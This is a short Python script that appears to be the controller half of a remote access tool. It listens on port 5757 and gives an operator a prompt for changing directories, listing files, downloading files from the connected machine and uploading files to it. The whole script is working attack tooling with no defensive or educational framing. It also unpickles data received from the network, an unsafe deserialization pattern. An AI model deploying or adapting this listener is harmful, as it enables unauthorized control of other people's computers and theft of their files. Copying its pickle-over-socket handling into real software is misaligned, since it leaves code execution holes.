import os
import socket
import pickle
import sys

socket = socket.socket()
socket.bind(("localhost", 5757))
socket.listen(2)
print("[+] Listner Started...")
con, addr = socket.accept()
print("[+] Listner Connected with ", addr)

def getfulname(com):
    name = ""
    l = len(com)
    for i in range(1,l, 1):
        name = name + com[i] + " "
    return name

def send(rc):
    size = sys.getsizeof(rc)
    con.send(pickle.dumps(size))
    ec = pickle.dumps(rc)
    con.send(ec)

def recv():
    size = con.recv(1024)
    res = con.recv(pickle.loads(size))
    res = pickle.loads(res)
    return res

def chdir(dir):
    send(dir)
    print(recv())

def listdir(com):
    send(com)
    res = recv()
    print(res.decode())


def writefile(name, data):
    file = open(name, "wb")
    file = file.write(data)


def readfile(name):
    file = open(name, "rb")
    file = file.read()
    return file

def download(com):
    name = getfulname(com)
    send(com)
    print("[+] File Downloading...")
    size = recv()
    data = con.recv(size)
    writefile("downloaded " + name, data)
    print("[+] File Downloaded...")

def upload(name):
    name = getfulname(name)
    size = os.path.getsize(name)
    print("[+] File Uploading...")
    send(size)
    data = readfile(name)
    con.sendall(data)
    print("[+] File Uploaded...")


while True:
    try:
        com = input(">>").split()

        if(com[0] == "exit"):
            send(com)
            sys.exit()

        elif(com[0] == "cd"):
            chdir(com)

        elif(com[0] == "dir"):
            listdir(com)

        elif(com[0] == 'download'):
            download(com)

        elif(com[0] == 'upload'):
            send(com)
            upload(com[1])
    except:
        continue